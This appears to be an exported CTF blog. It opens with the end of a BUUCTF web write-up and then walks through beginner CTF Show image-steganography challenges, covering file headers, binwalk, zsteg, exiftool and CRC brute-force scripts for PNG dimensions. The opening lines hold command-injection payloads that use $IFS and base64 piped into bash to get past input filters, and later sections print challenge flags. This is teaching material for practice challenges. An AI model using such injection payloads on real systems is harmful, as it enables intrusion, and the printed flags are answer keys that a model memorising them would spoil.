class="variable">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</span></span><br><span class="line"><span class="variable">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Show-Misc入门</title>
    <url>/2021/10/01/CTF-Show-Misc%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>CTF Show Misc 入门篇。</p>
<span id="more"></span>

<h1 id="Misc-入门"><a href="#Misc-入门" class="headerlink" title="Misc 入门"></a>Misc 入门</h1><h2 id="1-1-misc-1-—-QQ截图-直接识别图片内容"><a href="#1-1-misc-1-—-QQ截图-直接识别图片内容" class="headerlink" title="1.1 misc 1 — QQ截图 直接识别图片内容"></a>1.1 misc 1 — QQ截图 直接识别图片内容</h2><p><img src="https://i.loli.net/2021/08/06/Rx8sIlWr5dCVMBU.png" alt="image-20210806130402835"></p>
<p>图片直接是这个，我们可以 QQ 截图，使用当中的 屏幕识别 即可识别出文字</p>
<h2 id="1-2-misc-2-—-png-图片识别"><a href="#1-2-misc-2-—-png-图片识别" class="headerlink" title="1.2 misc 2 — png 图片识别"></a>1.2 misc 2 — png 图片识别</h2><p><img src="https://i.loli.net/2021/08/06/zi3RJMZBUgDIFV1.png" alt="image-20210806130536818"></p>
<p>记事本打开是这样，那肯定不是 .txt 文本文件</p>
<p>使用 Editor010 打开</p>
<p><img src="https://i.loli.net/2021/08/06/bMwnHSazE6ZumGk.png" alt="image-20210806131136158"></p>
<p>说明这是 png 文件，修改后缀，然后 QQ 屏幕识图即可</p>
<p><strong>补充知识：Python3 进行图片识别 <a href="https://segmentfault.com/a/1190000014091417">https://segmentfault.com/a/1190000014091417</a></strong></p>
<p><img src="https://i.loli.net/2021/08/08/uJiB5lEZkXsd1WG.png" alt="image-20210808212059742"></p>
<h2 id="1-3-misc-3-—-查看-bpg-图片"><a href="#1-3-misc-3-—-查看-bpg-图片" class="headerlink" title="1.3 misc 3 — 查看 bpg 图片"></a>1.3 misc 3 — 查看 bpg 图片</h2><p>是 bpg 图片，需要专门的查看工具 <a href="https://bellard.org/bpg/">https://bellard.org/bpg/</a></p>
<p><img src="https://i.loli.net/2021/08/06/ify8sS4qJTQcnHN.png" alt="image-20210806131927979"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用</span></span><br><span class="line">\bpj\bpgview.exe misc3.bpg</span><br></pre></td></tr></table></figure>

<h2 id="1-4-misc-4-—-图片格式-文件头"><a href="#1-4-misc-4-—-图片格式-文件头" class="headerlink" title="1.4 misc 4 — 图片格式 + 文件头"></a>1.4 misc 4 — 图片格式 + 文件头</h2><p><a href="https://baike.baidu.com/item/%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F/381122?fr=aladdin">图片格式</a></p>
<p><strong>JPEG</strong><br>文件头：FF D8 FF　　　　　<br>文件尾：FF D9</p>
<p><strong>TGA</strong><br>未压缩的前4字节 00 00 02 00<br>RLE压缩的前5字节 00 00 10 00 00</p>
<p><strong>PNG</strong></p>
<p>文件头：89 50 4E 47 0D 0A 1A 0A　　　　<br>文件尾：AE 42 60 82</p>
<p><strong>GIF</strong></p>
<p>文件头：47 49 46 38 39(37) 61　　　　<br>文件尾：00 3B</p>
<p><strong>BMP</strong></p>
<p>文件头：42 4D</p>
<p>文件头标识(2 bytes) 42(B) 4D(M)</p>
<p><strong>TIFF (tif)</strong></p>
<p>文件头：49 49 2A 00</p>
<p><strong>ico</strong></p>
<p>文件头：00 00 01 00</p>
<p><strong>Adobe Photoshop (psd)</strong></p>
<p>文件头：38 42 50 53</p>
<p><strong>一个一个查看，修改后缀</strong></p>
<p>1.txt png</p>
<p>2.txt jpg</p>
<p>3.txt bmp</p>
<p>4.txt gif</p>
<p>5.txt tif</p>
<p>6.txt webp</p>
<h2 id="1-5-misc-5-—-png-文件尾-添内容"><a href="#1-5-misc-5-—-png-文件尾-添内容" class="headerlink" title="1.5 misc 5 — png 文件尾 添内容"></a>1.5 misc 5 — png 文件尾 添内容</h2><p><img src="https://i.loli.net/2021/08/06/TdIf1OWxCinvLR6.png" alt="image-20210806133135512"></p>
<p>010打开</p>
<p><img src="https://i.loli.net/2021/08/06/z9YCQkL7JaZKE8t.png" alt="image-20210806133333684"></p>
<p>发现在 png 的文件尾后面多出了</p>
<h2 id="1-6-misc-6-—-jpg-文件-添内容"><a href="#1-6-misc-6-—-jpg-文件-添内容" class="headerlink" title="1.6 misc 6 — jpg 文件 添内容"></a>1.6 misc 6 — jpg 文件 添内容</h2><p><img src="https://i.loli.net/2021/08/06/PsSiYcQVTj5Bt1g.png" alt="image-20210806142710191"></p>
<h2 id="1-7-misc-7-—-flag在图片文件信息中"><a href="#1-7-misc-7-—-flag在图片文件信息中" class="headerlink" title="1.7 misc 7 — flag在图片文件信息中"></a>1.7 misc 7 — flag在图片文件信息中</h2><p><strong>flag在图片文件信息中。</strong></p>
<p><img src="https://i.loli.net/2021/08/06/FXqw91zIl7HtOfx.png" alt="image-20210806143036016"></p>
<p><strong>常用到的手段还有</strong></p>
<ul>
<li>右键–属性</li>
<li>工具 <a href="https://exif.tuchong.com/">图虫查看器</a> 能够查看图片的详细信息</li>
</ul>
<h2 id="1-8-misc-8-—-flag在图片文件中图片文件中-—-binwalk-foremost"><a href="#1-8-misc-8-—-flag在图片文件中图片文件中-—-binwalk-foremost" class="headerlink" title="1.8 misc 8 — flag在图片文件中图片文件中 — binwalk  foremost"></a>1.8 misc 8 — flag在图片文件中图片文件中 — binwalk  foremost</h2><p><strong>flag在图片文件中图片文件中。</strong></p>
<p>010 打开</p>
<p><img src="https://i.loli.net/2021/08/06/SOIugvK2PU5Jql6.png" alt="image-20210806144045544"></p>
<p>可以发现，该 png 图片当中 还包含着一张 png 图片</p>
<p><strong>图片隐藏文件 binwalk  foremost</strong></p>
<p><a href="https://blog.csdn.net/Sc0fie1d/article/details/101602492">https://blog.csdn.net/Sc0fie1d/article/details/101602492</a></p>
<p><img src="https://i.loli.net/2021/08/06/C3Xg98KxbPEwpD1.png" alt="image-20210806144305711"></p>
<h2 id="1-9-misc-9-—-flag在图片块里"><a href="#1-9-misc-9-—-flag在图片块里" class="headerlink" title="1.9 misc 9 — flag在图片块里"></a>1.9 misc 9 — flag在图片块里</h2><p><img src="https://i.loli.net/2021/08/06/i9uzv5cNeaIYZK6.png" alt="image-20210806144814605"></p>
<h2 id="1-10-misc-10-—-flag在图片数据里"><a href="#1-10-misc-10-—-flag在图片数据里" class="headerlink" title="1.10 misc 10 — flag在图片数据里"></a>1.10 misc 10 — flag在图片数据里</h2><p><img src="https://img-blog.csdnimg.cn/2021040323291259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://i.loli.net/2021/08/06/9fUygEpk5xD64CY.png" alt="image-20210806150628472"></p>
<p>两个 IDAT 块</p>
<p><a href="https://blog.csdn.net/wxh0000mm/article/details/85683661">binwalk 工具</a></p>
<p><img src="https://i.loli.net/2021/08/06/eiTxaH3R5QyXsCM.png" alt="image-20210806145504944"></p>
<p><img src="https://i.loli.net/2021/08/06/VAtQ7vGkhoydjCg.png" alt="image-20210806145800458"></p>
<p>解释：zlib 是 PNG IDAT 块数据可选的压缩格式</p>
<p>题者自己生成了一段 zlib 压缩数据，然后加上长度位、标识位、与 CRC 校验位，将其伪装成了一个 IDAT 块，插在图片当中</p>
<p>而 binwalk 会自动找到 zlib 块并提取出来解压，所以最终得到的提取结果中就含有 flag 了</p>
<h2 id="1-11-misc-11-—-flag在另一张图里"><a href="#1-11-misc-11-—-flag在另一张图里" class="headerlink" title="1.11 misc 11 — flag在另一张图里"></a>1.11 misc 11 — flag在另一张图里</h2><p><img src="https://i.loli.net/2021/08/06/TRVfhLlAZtEbz8G.png" alt="image-20210806150503285"></p>
<p>两个 IDAT 块 </p>
<p>再次使用上一关的解法，不可行</p>
<p>搜集资料之后，必须首先将多余的那个 IDAT 块删除才可</p>
<p>工具 <a href="http://entropymine.com/jason/tweakpng/">tweakpng</a></p>
<p><img src="https://i.loli.net/2021/08/06/XYpNZg5y4Mrz8ad.png" alt="image-20210806152327628"></p>
<p>将第一个 IDAT 块右键删除即可</p>
<p>ctfshow{44620176948fa759d3eeafeac99f1ce9}</p>
<h2 id="1-12-misc-12-—-flag在另一张图里"><a href="#1-12-misc-12-—-flag在另一张图里" class="headerlink" title="1.12 misc 12 — flag在另一张图里"></a>1.12 misc 12 — flag在另一张图里</h2><p><strong>flag在另一张图里。</strong></p>
<p>与上一关的做法相同，只不过，不确定删除几个 IDAT 块，每次删完一个保存尝试查看即可</p>
<h2 id="1-13-misc-13-—-flag位置在图片末尾"><a href="#1-13-misc-13-—-flag位置在图片末尾" class="headerlink" title="1.13 misc 13 — flag位置在图片末尾"></a>1.13 misc 13 — flag位置在图片末尾</h2><p><strong>flag位置在图片末尾。</strong></p>
<p><img src="https://i.loli.net/2021/08/06/HQLKmqTDYX29ect.png" alt="image-20210806152900284"></p>
<p>可以看到一部分类似 flag 的字符串</p>
<p>我们将乱七八糟的删除即可，每隔一个删除一个</p>
<h2 id="1-14-misc-14-—-flag在那张图里"><a href="#1-14-misc-14-—-flag在那张图里" class="headerlink" title="1.14 misc 14 — flag在那张图里"></a>1.14 misc 14 — flag在那张图里</h2><p><strong>flag在那张图里。</strong></p>
<p><img src="https://i.loli.net/2021/08/06/MhJSlyqzXk9vTRb.png" alt="image-20210806160143737"></p>
<p><img src="https://i.loli.net/2021/08/06/DqM6Oeojm84sPCQ.png" alt="image-20210806161032310"></p>
<p>记得从 FF D8 开始</p>
<p>新建一个新的文件 jpg 打开</p>
<p><img src="https://i.loli.net/2021/08/06/M8uZkhLQ3lBrvCq.png" alt="image-20210806161419857"></p>
<p>注意：QQ识图 有时不准确，比如 0 和 8</p>
<h2 id="1-15-misc-15-—-flag被跳过去了"><a href="#1-15-misc-15-—-flag被跳过去了" class="headerlink" title="1.15 misc 15 — flag被跳过去了"></a>1.15 misc 15 — flag被跳过去了</h2><p><img src="https://i.loli.net/2021/08/06/ZjgFo1C7Q6vrXa4.png" alt="image-20210806162024516"></p>
<h2 id="1-16-misc-16-—-flag在图片数据里"><a href="#1-16-misc-16-—-flag在图片数据里" class="headerlink" title="1.16 misc 16 — flag在图片数据里"></a>1.16 misc 16 — flag在图片数据里</h2><p><strong>flag在图片数据里。</strong></p>
<p>binwalk 提取文件</p>
<p><img src="https://i.loli.net/2021/08/06/nlOwMb7TYjHvmVa.png" alt="image-20210806162229301"></p>
<h2 id="1-17-misc-17-—-flag在图片数据里-—-zsteg"><a href="#1-17-misc-17-—-flag在图片数据里-—-zsteg" class="headerlink" title="1.17 misc 17 — flag在图片数据里 — zsteg"></a>1.17 misc 17 — flag在图片数据里 — zsteg</h2><p><strong>flag在图片数据里。</strong></p>
<p><a href="https://blog.csdn.net/Amherstieae/article/details/107512398?ops_request_misc=&request_id=&biz_id=102&utm_term=zsteg&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-.nonecase&spm=1018.2226.3001.4187">zsteg 安装 及 使用</a></p>
<blockquote>
<p><strong>zsteg可以检测PNG和BMP图片里的隐写数据。</strong></p>
<p><strong>目前，zsteg支持检测：</strong></p>
<p>LSB steganography in PNG &amp; BMP<br>zlib-compressed data<br>OpenStego<br>Camouflage 1.2.1<br>LSB with The Eratosthenes set</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zsteg misc17.png</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/18/LKIYqbx6zagBPij.png" alt="image-20210818084217889"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zsteg -E <span class="string">&quot;extradata:0&quot;</span> misc17.png &gt; 1.txt</span><br><span class="line">binwalk -e 1.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/18/3Q4ufwqRHpg7sDA.png" alt="image-20210818084305522"></p>
<h2 id="1-18-misc-18-—-flag在标题、作者、照相机和镜头型号里"><a href="#1-18-misc-18-—-flag在标题、作者、照相机和镜头型号里" class="headerlink" title="1.18 misc 18 — flag在标题、作者、照相机和镜头型号里"></a>1.18 misc 18 — flag在标题、作者、照相机和镜头型号里</h2><p><strong>flag在标题、作者、照相机和镜头型号里。</strong></p>
<p><img src="https://i.loli.net/2021/08/06/xNsXTekIu8rQicp.png" alt="image-20210806164253394"></p>
<p>右键属性查看</p>
<h2 id="1-19-misc-19-—-flag在主机上的文档名里"><a href="#1-19-misc-19-—-flag在主机上的文档名里" class="headerlink" title="1.19 misc 19 — flag在主机上的文档名里"></a>1.19 misc 19 — flag在主机上的文档名里</h2><p><img src="https://i.loli.net/2021/08/06/4x7pI5l6Ji2LXD9.png" alt="image-20210806164624752"></p>
<h2 id="1-20-misc-20-—-flag在评论里"><a href="#1-20-misc-20-—-flag在评论里" class="headerlink" title="1.20 misc 20 — flag在评论里"></a>1.20 misc 20 — flag在评论里</h2><p><strong>图虫查看器</strong> </p>
<p><a href="https://exif.tuchong.com/">https://exif.tuchong.com/</a></p>
<p><img src="https://i.loli.net/2021/08/06/vmXoFLcraHVux81.png" alt="image-20210806164933737"></p>
<p>ctfshow{c97964b1aecf06e1d79c21ddad593e42}</p>
<h2 id="1-21-misc-21-—-flag在序号里"><a href="#1-21-misc-21-—-flag在序号里" class="headerlink" title="1.21 misc 21 — flag在序号里"></a>1.21 misc 21 — flag在序号里</h2><p><strong>flag在序号里。</strong></p>
<p><img src="https://i.loli.net/2021/08/06/fZSn92xQVupkjm8.png" alt="image-20210806165515702"></p>
<p><img src="https://i.loli.net/2021/08/06/UhKEkJ1cCenrjBW.png" alt="image-20210806165604429"></p>
<p><img src="https://i.loli.net/2021/08/06/GAKM9qvI2wHXZdy.png" alt="image-20210806165842984"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(hex(3902939465)+hex(2371618619)+hex(1082452817)+hex(2980145261))</span><br><span class="line">0xe8a221490x8d5c073b0x4084eb510xb1a1686d</span><br></pre></td></tr></table></figure>

<p>删掉 0x 即可</p>
<h2 id="1-22-misc22-—-flag-在图片里-—-缩略图-—-exiftool"><a href="#1-22-misc22-—-flag-在图片里-—-缩略图-—-exiftool" class="headerlink" title="1.22 misc22 — flag 在图片里 — 缩略图 — exiftool"></a>1.22 misc22 — flag 在图片里 — 缩略图 — exiftool</h2><p><img src="https://i.loli.net/2021/08/18/s3uYmaIvdQoCntb.png" alt="image-20210818085210755"></p>
<p>设置为平铺之后，可以依稀看出来该图片下方有着黄色的一行，但是点击查看之后又看不出来</p>
<p><strong>这是一种缩略图隐写的方式，叫做thumbnail隐写</strong></p>
<p><a href="https://blog.csdn.net/qq_41453285/article/details/101765775?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162924833616780274173567%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162924833616780274173567&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-101765775.first_rank_v2_pc_rank_v29&utm_term=exiftool&spm=1018.2226.3001.4187">exiftool</a></p>
<p><img src="https://i.loli.net/2021/08/18/lh2CPzr7Icn6ETL.png" alt="image-20210818090550904"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exiftool.exe -ThumbnaiImage -b misc22.jpg &gt; 111.jpg</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/18/f2B4y1Vlg7C9TkU.png" alt="image-20210818091200925"></p>
<p>ctfshow{dbf7d3f84b0125e833dfd3c80820a129}</p>
<h2 id="1-23-misc23-—-flag在时间里-—"><a href="#1-23-misc23-—-flag在时间里-—" class="headerlink" title="1.23 misc23 — flag在时间里 —"></a>1.23 misc23 — flag在时间里 —</h2><p>exiftool 查看实践</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exiftool.exe misc23.psd</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/18/pmdsDHbnO78GAKE.png" alt="image-20210818091639071"></p>
<p> ctfshow{}, UnixTimestamp, DECtoHEX, getflag</p>
<p>Unix 时间戳，十进制到十六进制，获取 flag</p>
<p>1997:09:22 02:17:02+08:00</p>
<p>2055:07:15 12:14:48+08:00</p>
<p>2038:05:05 16:50:45+08:00</p>
<p>1984:08:03 18:41:46+08:00</p>
<p><a href="">在线时间戳转换</a></p>
<p><img src="https://i.loli.net/2021/08/18/yxjk3vDiorTaS7F.png" alt="image-20210818092609921"></p>
<p>874865822</p>
<p>2699237688</p>
<p>2156662245</p>
<p>460377706</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(hex(874865822)+hex(2699237688)+hex(2156662245)+hex(460377706))</span><br><span class="line">0x3425649e0xa0e319380x808c0de50x1b70ce6a</span><br></pre></td></tr></table></figure>

<p>ctfshow{3425649ea0e31938808c0de51b70ce6a}</p>
<h2 id="1-24-misc41"><a href="#1-24-misc41" class="headerlink" title="1.24 misc41"></a>1.24 misc41</h2><p><strong>（本题为Misc入门图片篇和愚人节比赛特别联动题）</strong><br><strong>H4ppy Apr1l F001’s D4y！<br>愚人节到了，一群笨蛋往南飞，一会儿排成S字，一会儿排成B字。</strong></p>
<p>H4ppy Apr1l F001’s D4y！</p>
<p>这是个提示：F001，010 搜索 F001，发现存在大量，组成了刺目的形状，读取出来即可</p>
<p><img src="https://i.loli.net/2021/08/18/iQu4oTsBpj5VSbK.png" alt="image-20210818093403414"></p>
<p>ctfshow{fcbd427caf4a52f1147ab44346cd1cdd}</p>
<h2 id="1-25-misc24-—-flag在图片上面-—-bmp-图片改高度"><a href="#1-25-misc24-—-flag在图片上面-—-bmp-图片改高度" class="headerlink" title="1.25 misc24 — flag在图片上面 — bmp 图片改高度"></a>1.25 misc24 — flag在图片上面 — bmp 图片改高度</h2><p><a href="https://blog.csdn.net/aidem_brown/article/details/80500637">bmp 位图文件解析</a></p>
<p>900*150=135000个像素大小</p>
<p>该图片总共 675056 个字节，文件尾的位置在675053字节处(后面两个字节是windows的”<strong>补0</strong>”)</p>
<p>文件头共 53 字节</p>
<p><strong>每个像素点由3个字节（十六进制码6位）表示，每个字节负责控制一种颜色，分别为蓝（Blue）、绿（Green）、红（Red）</strong></p>
<p>(675053-53)/3=225000</p>
<p>得到真实的像素大小</p>
<p>该题只有高不对，则正确的宽依旧是 900</p>
<p>得到 225000/900=高 250</p>
<p>修改高为 hex(250)=FA</p>
<p><img src="https://i.loli.net/2021/08/18/NGuDSj1aL6Ii9vo.png" alt="image-20210818122344260"></p>
<p>还是 0096 的位置修改</p>
<p><img src="https://i.loli.net/2021/08/18/X9QjZ8bHJ2oUc7x.png" alt="image-20210818122451730"></p>
<p>保存得到flag</p>
<h2 id="1-26-misc25-—-flag在图片下面-—-png-图片改高度"><a href="#1-26-misc25-—-flag在图片下面-—-png-图片改高度" class="headerlink" title="1.26 misc25 — flag在图片下面 — png 图片改高度"></a>1.26 misc25 — flag在图片下面 — png 图片改高度</h2><p><img src="https://i.loli.net/2021/08/18/Yn7Ss6BOiae3mZ2.png" alt="image-20210818094843932"></p>
<p>0096 改成 0196 0296 都可</p>
<p><img src="https://i.loli.net/2021/08/18/XGi2Mk35UJRTBcq.png" alt="image-20210818094920712"></p>
<h2 id="1-27-misc26-—-flag还是在图片下面，但到底有多下面？"><a href="#1-27-misc26-—-flag还是在图片下面，但到底有多下面？" class="headerlink" title="1.27 misc26 — flag还是在图片下面，但到底有多下面？"></a>1.27 misc26 — flag还是在图片下面，但到底有多下面？</h2><p><img src="https://i.loli.net/2021/08/18/U2a1CMOwjg7eoFQ.png" alt="image-20210818095156426"></p>
<p>ctfshow{94aef1</p>
<p>+True height(hex) of this picture+</p>
<p>087a7ccf2e28e742efd704c}</p>
<p><img src="https://i.loli.net/2021/08/18/nFv9oAalI6by3CG.png" alt="image-20210818095534774"></p>
<p><a href="https://blog.csdn.net/weixin_44145452/article/details/109612189">https://blog.csdn.net/weixin_44145452/article/details/109612189</a></p>
<p>会提示校验码错误</p>
<p><strong>CRC32是有哪些字节构成的</strong>？</p>
<p>PNG文件中总是以固定的八个字节开头</p>
<blockquote>
<p> 89 50 4E 47  0D 0A 1A 0A</p>
</blockquote>
<p>数据块长度3</p>
<blockquote>
<p>00 00 00 0D</p>
</blockquote>
<p>文件头数据块标示IDCH</p>
<blockquote>
<p>49 48 44 52</p>
</blockquote>
<p>13位数据块（IHDR）<br>下面为宽和高</p>
<blockquote>
<p>00 00 07 7E  00 00 03 60</p>
</blockquote>
<p>这5个字节依次为Bit depth，ColorType，Compression method，Filter method，Interlace method</p>
<blockquote>
<p>08 06 00 00 00</p>
</blockquote>
<p>接下来的四字节为该png图片的CRC校验码</p>
<blockquote>
<p>7D C7 3F 7F</p>
</blockquote>
<p>CRC校验码，由IDCH和IHDR共十七位字节进行crc计算得到</p>
<p><strong>解决方法：</strong><br>1.简单点的隐写题，可以直接修改宽高，然后显示flag<br>2.那么如果修改宽高，并不会直接看到flag，需要放入stegsolve里或者做其它的进一步处理时。<br>这里会产生一个问题，那就是修改过宽高的图片stegsolve无法打开，提示IO错误。<br>这是因为png图像的IHDR段中的高宽被修改，导致计算出来的CRC不正确，所以无法正确读取。<br>通过python2脚本来获取图片高度</p>
<p><strong>获取图片高度</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">crc32key = 0x7DC73F7F</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0, 65535):</span><br><span class="line">  height = struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)</span><br><span class="line">  <span class="comment">#CRC: 7DC73F7F</span></span><br><span class="line">  data = <span class="string">&#x27;\x49\x48\x44\x52\x00\x00\x07\x7E&#x27;</span> + height + <span class="string">&#x27;\x08\x06\x00\x00\x00&#x27;</span></span><br><span class="line">  crc32result = binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">  <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(map(lambda c: <span class="string">&quot;%02X&quot;</span> % ord(c), height))</span><br></pre></td></tr></table></figure>

<p><strong>爆破图片正常宽高</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import structimport zlibdef hexStr2bytes(s):    b = b<span class="string">&quot;&quot;</span>    <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(s),2):        temp = s[i:i+2]        b +=struct.pack(<span class="string">&quot;B&quot;</span>,int(temp,16))    <span class="built_in">return</span> bstr1=<span class="string">&quot;49484452&quot;</span>         <span class="comment">#文件头数据块标示IDCHstr2=&quot;0806000000&quot;       #五字节：Bit depth，ColorType，Compression method，Filter method，Interlace methodbytes1=hexStr2bytes(str1)bytes2=hexStr2bytes(str2)wid,hei = 900,150       #宽高 像素crc32 = &quot;0xec9ccbc6&quot;    #校验码for w in range(wid,wid+2000):    for h in range(hei,hei+2000):        width = hex(w)[2:].rjust(8,&#x27;0&#x27;)        height = hex(h)[2:].rjust(8,&#x27;0&#x27;)        bytes_temp=hexStr2bytes(width+height)        if eval(hex(zlib.crc32(bytes1+bytes_temp+bytes2))) == eval(crc32):            print(hex(w),hex(h))</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/18/YDhUVyJfuWLqTHG.png" alt="image-20210818100740105"></p>
<p>ctfshow{94aef1</p>
<p>+True height(hex) of this picture+</p>
<p>087a7ccf2e28e742efd704c}</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;94aef125e087a7ccf2e28e742efd704c&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-28-misc27-—-flag在图片下面"><a href="#1-28-misc27-—-flag在图片下面" class="headerlink" title="1.28 misc27 — flag在图片下面"></a>1.28 misc27 — flag在图片下面</h2><p><img src="https://i.loli.net/2021/08/18/lJOhAfSi9oUprB4.png" alt="image-20210818102436038"></p>
<p>寻找 0096</p>
<h2 id="1-29-misc28-—-flag在图片下面-—-gif"><a href="#1-29-misc28-—-flag在图片下面-—-gif" class="headerlink" title="1.29 misc28 — flag在图片下面 — gif"></a>1.29 misc28 — flag在图片下面 — gif</h2><p>9600 更改为 FF00，两处</p>
<p><img src="https://i.loli.net/2021/08/18/ORvZCma3I9obkwW.png" alt="image-20210818103453893"></p>
<p>gif.bt  ???????</p>
<h2 id="1-30-misc29-—-flag在图片下面"><a href="#1-30-misc29-—-flag在图片下面" class="headerlink" title="1.30 misc29 — flag在图片下面"></a>1.30 misc29 — flag在图片下面</h2><p>9600 更改为 FF00，十处，然后 stegsolve 逐帧查看</p>
<p><img src="https://i.loli.net/2021/08/18/28FwOXBWE71SrjL.png" alt="image-20210818104202161"></p>
<h2 id="1-31-misc30-—-正确的宽度是950"><a href="#1-31-misc30-—-正确的宽度是950" class="headerlink" title="1.31 misc30 — 正确的宽度是950"></a>1.31 misc30 — 正确的宽度是950</h2><p>修改 bmp 宽度为 hex(950)</p>
<p><img src="https://i.loli.net/2021/08/18/78twlxqsrMUOHTj.png" alt="image-20210818122816045"></p>
<h2 id="1-32-misc31-—-高度是正确的，但正确的宽度是多少呢"><a href="#1-32-misc31-—-高度是正确的，但正确的宽度是多少呢" class="headerlink" title="1.32 misc31 — 高度是正确的，但正确的宽度是多少呢"></a>1.32 misc31 — 高度是正确的，但正确的宽度是多少呢</h2><p>同 misc24</p>
<p>图片总共 487256 字节，去掉文件尾，得到 487253</p>
<p>900*150=135000</p>
<p>文件头 53 字节</p>
<p>(487253-53)/3=162400</p>
<p>高正确，150</p>
<p>宽：162400/150=1082.67</p>
<p>改宽为 1082</p>
<h2 id="1-33-misc32-—-高度是正确的，但正确的宽度是多少呢"><a href="#1-33-misc32-—-高度是正确的，但正确的宽度是多少呢" class="headerlink" title="1.33 misc32 — 高度是正确的，但正确的宽度是多少呢"></a>1.33 misc32 — 高度是正确的，但正确的宽度是多少呢</h2><p>png 计算宽高</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import structimport zlibdef hexStr2bytes(s):    b = b<span class="string">&quot;&quot;</span>    <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(s),2):        temp = s[i:i+2]        b +=struct.pack(<span class="string">&quot;B&quot;</span>,int(temp,16))    <span class="built_in">return</span> bstr1=<span class="string">&quot;49484452&quot;</span>         <span class="comment">#文件头数据块标示IDCHstr2=&quot;0802000000&quot;       #五字节：Bit depth，ColorType，Compression method，Filter method，Interlace methodbytes1=hexStr2bytes(str1)bytes2=hexStr2bytes(str2)wid,hei = 900,150       #宽高 像素crc32 = &quot;0xe14a4c0b&quot;    #校验码for w in range(wid,wid+2000):    for h in range(hei,hei+2000):        width = hex(w)[2:].rjust(8,&#x27;0&#x27;)        height = hex(h)[2:].rjust(8,&#x27;0&#x27;)        bytes_temp=hexStr2bytes(width+height)        if eval(hex(zlib.crc32(bytes1+bytes_temp+bytes2))) == eval(crc32):            print(hex(w),hex(h))</span></span><br></pre></td></tr></table></figure>

<p>0x414 0x96</p>
<p><img src="https://i.loli.net/2021/08/18/puJBmM9NFYwl1bd.png" alt="image-20210818124125740"></p>
<h2 id="1-34-misc33-—-出题人丧心病狂，把高度也改了"><a href="#1-34-misc33-—-出题人丧心病狂，把高度也改了" class="headerlink" title="1.34 misc33 — 出题人丧心病狂，把高度也改了"></a>1.34 misc33 — 出题人丧心病狂，把高度也改了</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import zlibimport struct<span class="comment"># 同时爆破宽度和高度filename = &quot;misc33.png&quot;with open(filename, &#x27;rb&#x27;) as f:    all_b = f.read()    data = bytearray(all_b[12:29])    n = 4095    for w in range(n):        width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w))        for h in range(n):            height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h))            for x in range(4):                data[x+4] = width[x]                data[x+8] = height[x]            crc32result = zlib.crc32(data)            #替换成图片的crc            if crc32result == 0x5255a798:                print(&quot;宽为：&quot;, end = &#x27;&#x27;)                print(width, end = &#x27; &#x27;)                print(int.from_bytes(width, byteorder=&#x27;big&#x27;))                print(&quot;高为：&quot;, end = &#x27;&#x27;)                print(height, end = &#x27; &#x27;)                print(int.from_bytes(height, byteorder=&#x27;big&#x27;))</span></span><br></pre></td></tr></table></figure>

<p>宽为：bytearray(b’\x00\x00\x03\xd2’) 978<br>高为：bytearray(b’\x00\x00\x00\x8e’) 142</p>
